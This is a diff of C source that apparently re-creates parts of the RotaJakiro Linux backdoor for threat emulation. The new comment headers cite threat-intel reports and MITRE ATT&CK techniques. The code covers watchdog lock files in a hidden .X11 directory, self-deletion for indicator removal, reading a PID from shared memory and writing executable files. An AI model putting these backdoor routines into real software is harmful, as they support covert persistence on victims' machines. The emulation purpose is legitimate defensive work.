@@ -15,12 +15,16 @@
 #include <errno.h>
 #include <limits.h>
 
-/**
- * Create a lock file to ensure one instance is running.
- * TODO - but how does this apply to the watch dog instances?
- * @param N/A
- * @return void
- * */
+// check_lock
+// About:
+//    Create file locks to indicate which file should be spawned for watchdog processes
+// Result: lock files and assocaited directories created
+// MITRE ATT&CK Techniques:
+//     TODO - In new version of ATT&CK?
+// CTI:
+//     https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+// Other References:
+//     https://www.virustotal.com/gui/file/d38e8f113c36cfa9e05c4d0d6b526d81b69039430c3b1fc64a08a3445b5a5abe
 void create_lock(int lock_id) {
 
     char *HOME = getenv("HOME");
@@ -79,7 +83,6 @@ void create_lock(int lock_id) {
 
 
         // create directory of .X11 if it does not exist
-        // TODO - what perms?
         int fd = open(flock_path_2, O_CREAT);
         if (fd != -1) {
             // placing advisory lock on file
@@ -94,11 +97,16 @@ void create_lock(int lock_id) {
 }
 
 
-/**
- * @brief check if a given lock file is currently in use to identify which process to spawn.
- * @param char pointer to file path to check if lock file is present
- * @return integer value indicating which file is locked
- * */
+// lock_check
+// About:
+//    Check if a file is locked or not
+// Result: Integer value indicating if a file is locked.
+// MITRE ATT&CK Techniques:
+//     TODO - In new version of ATT&CK?
+// CTI:
+//     https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+// Other References:
+//     https://www.virustotal.com/gui/file/d38e8f113c36cfa9e05c4d0d6b526d81b69039430c3b1fc64a08a3445b5a5abe
 int lock_check(char *fpath) {
 
     // gain file handle to fpath
@@ -122,11 +130,16 @@ int lock_check(char *fpath) {
 }
 
 
-/**
- * @brief delete file based on fpath
- * @param file path to delete
- * @return boolean value indicating success/failure
- **/
+// self_delete
+// About:
+//    Delete a file at a given path
+// Result: boolean value indicating success or failure of deleting a file
+// MITRE ATT&CK Techniques:
+//     T1070.004 - Indicator Removal: File Deletion
+// CTI:
+//     https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+// Other References:
+//     https://www.virustotal.com/gui/file/d38e8f113c36cfa9e05c4d0d6b526d81b69039430c3b1fc64a08a3445b5a5abe
 bool self_delete(char *fpath) {
 
     int res = unlink(fpath);
@@ -140,15 +153,16 @@ bool self_delete(char *fpath) {
 }
 
 
-/**
- * obtain PID from shared mem instance
- *
- * @param size: size of data to copy into buffer
- * @param fpath file path to read in
- *
- * @return pointer to char buffer
- * */
-
+// copy_pid_from_shared_mem
+// About:
+//     Obtain PID from shared memory
+// Result: char *of shared memory.
+// MITRE ATT&CK Techniques:
+//     TODO - In new version of ATT&CK?
+// CTI:
+//     https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+// Other References:
+//     https://www.virustotal.com/gui/file/d38e8f113c36cfa9e05c4d0d6b526d81b69039430c3b1fc64a08a3445b5a5abe
 char *copy_pid_from_shared_mem(uint size, char *fpath) {
 
     // the structure was copied from reverse engineering
@@ -172,58 +186,24 @@ char *copy_pid_from_shared_mem(uint size, char *fpath) {
     return filePathBuff;
 }
 
+// write_to_file
+// About:
+//     Write data to a given fpath
+// Result: boolean value indicating success or failure of writing data
+// MITRE ATT&CK Techniques: N/A
+// CTI: N/A
+// Other References: N/A
+ bool write_to_file(char *fpath, char *data) {
 
+     int fd = open(fpath, O_CREAT | O_WRONLY, S_IRUSR|S_IEXEC);
+     int numbyteswritten = write(fd, data, strlen(data));
 
-/**
- * Write data to a given fpath
- *
- * @param size: size of data to copy into buffer
- * @param fpath file path to read in
- *
- * @return integer value
- * */
-bool write_to_file(char *fpath, char *data) {
+     close(fd);
+     if (numbyteswritten == strlen(data)) {
+         return true;
+     } else {
+         return false;
+     }
 
-    // TODO - double check file permissions
-    int fd = open(fpath, O_CREAT | O_WRONLY, S_IRUSR|S_IEXEC);
-    int numbyteswritten = write(fd, data, strlen(data));
-
-    close(fd);
-    if (numbyteswritten == strlen(data)) {
-        return true;
-    } else {
-        return false;
-    }
-
-    return false;
-}
-
-
-bool get_pwd() {
-
-    char *cwd = (char *)malloc(256);
-    memset(cwd, 0, 256);
-    getcwd(cwd, 256);
-
-    // 47 == hex for "/"
-    char *basename = strrchr(cwd, 47);
-
-    // session-dbus
-    if (strncmp("/sessions", basename, strlen("sessions")) == 0) {
-        return false;
-    // gvfsd
-    } else if (strncmp("/.profile", basename, strlen("/.profile")) == 0) {
-        return true;
-    } else {
-        return true;
-    }
-}
-
-/*
-void _mkdir(bool home, char *fpath, int mode) {
-
-    char tmpPath[PATH_MAX];
-    char *path = NULL;
-    int len;
-}
-*/
+     return false;
+ }
